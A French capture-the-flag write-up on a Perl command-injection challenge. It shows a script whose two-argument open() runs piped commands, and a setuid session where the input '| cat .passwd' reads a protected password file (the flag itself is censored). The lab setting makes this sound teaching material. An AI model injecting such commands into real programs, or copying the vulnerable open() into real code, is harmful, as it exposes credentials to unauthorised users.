# Perl - Command injection

## 15 Points

### Bad tainting

## Énoncé

Récupérez le mot de passe contenu dans le fichier .passwd.

## Solution

Pour ce challenge, on a un fichier **ch27.pl**, dans lequel on retrouve un code perl qui va exécuter un prompt dans lequel il attend le nom d'un fichier pour pouvoir afficherle nombre de ligne, de mot et de caractères.
On retrouve aussi le fichier **setuidwrapper.c**, avec son exécutable, dans lequel cela va d'abord exécuter **setreuid(geteuid(), geteuid())** avant d'exécuter **./ch27.pl** dans l'objectif de pouvoir garder l'EUID au moment de l'exécution du fichier perl.

Dans le fichier perl, on s'apperçoit que pour lire ce qu'on lui envoie, le fichier utilise la fonction **open()**:
```Perl
sub process_file {
    my $file = shift;
    my $line;
    my ($line_count, $char_count, $word_count) = (0,0,0);
 
    $file =~ /(.+)/;
    $file = $1;
    if(!open(F, $file)) {
        die "[-] Can't open $file: $!\n";
    }
 
 
    while(($line = <F>)) {
        $line_count++;
        $char_count += length $line;
        $word_count += scalar(split/\W+/, $line);
    }
 
    print "~~~ Statistics for \"$file\" ~~~\n";
    print "Lines: $line_count\n";
    print "Words: $word_count\n";
    print "Chars: $char_count\n";
 
    close F;
}
```

Or, on sait qu'en perl cette fonction est vulnérable et peut exécuter des commandes, il faut donc trouver un moyen de lui envoyer la commande:
```bash
cat .passwd
```

Pour ceci, avec la recherche la plus simple et rapide, on trouve directement que l'on peut envoyer la commande après un pipe, on va donc faire:
```bash
app-script-ch7@challenge02:~$ ./setuid-wrapper 
*************************
* Stat File Service    *
*************************
>>> | cat .passwd
~~~ Statistics for "| cat .passwd" ~~~
Lines: 0
Words: 0
Chars: 0
[censorship]
>>> exit
```

et le tour est joué !